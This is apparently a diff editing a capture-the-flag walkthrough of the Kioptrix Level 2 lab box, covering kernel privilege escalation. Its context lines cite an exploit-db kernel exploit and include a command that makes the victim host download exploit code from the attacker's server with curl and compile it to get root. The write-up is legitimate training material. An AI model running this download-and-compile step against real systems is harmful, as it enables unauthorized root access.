@@ -125,8 +125,7 @@ Feels good once you get that shell, doesn't it? Non the less, we need to escalat
 There are 2 users in the home directory (john and harold), however both of them have restriced home folders which we can not access. A search for uncommon misconfigurations such as writable passwd or shadow file yielded no result. After a while during my system enumeration I spotted that the kernel is pretty outdated. 
 `uname -a` results in  `Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux`
 
-Last compiled in 2007? This possibly opens up a privilege escalation vulnerability. After the finding, google search or exploitdb can be used for locating a corresponding kernel exploit.  
-File of interest: <https://www.exploit-db.com/exploits/9545/>. Usually it's a good practice to avoid kernel exploitation as this opens up many dangers such as crashing or corrupting the machine. Always make sure there are no other options before trying kernel exploitation!
+Last compiled in 2007? This possibly opens up a privilege escalation vulnerability. After the finding, google search or exploitdb can be used for locating a corresponding kernel exploit. File of interest: <https://www.exploit-db.com/exploits/9545/>. Usually it's a good practice to avoid kernel exploitation as this opens up many dangers such as crashing or corrupting the machine. Always make sure there are no other options before trying kernel exploitation!
 
 I decided to download the code onto my machine, host it on apache 2 webserver and make the victim download it via the previously gained shell. Here are the steps:
 
@@ -161,9 +160,10 @@ cd /tmp && id && curl 192.168.0.213/exploit.c -o exploit.c 2> /dev/null && gcc e
 
 ## <centre>Congratulations! The box has been rooted!</centre>
 
+
 # Conclusion
-A solid box with a lot of hidden knowledge for new people entering infosec community. There are always things to learn no matter how you many times you do them - same with this box. Personally I found this challenge quite easy, but enjoyed it non the less. My thanks goes to the creator for making such an awesome box.
--
+A solid box with a lot of hidden knowledge for new people entering infosec community. There are always things to learn no matter how many times you do them - same with this box. Personally I found this challenge quite easy, but enjoyed it non the less. My thanks goes to the creator for making such an awesome box.
+
 Have any suggestions or feedback? Write it down below in the comments or send me a message on twitter!
 
 ~V3
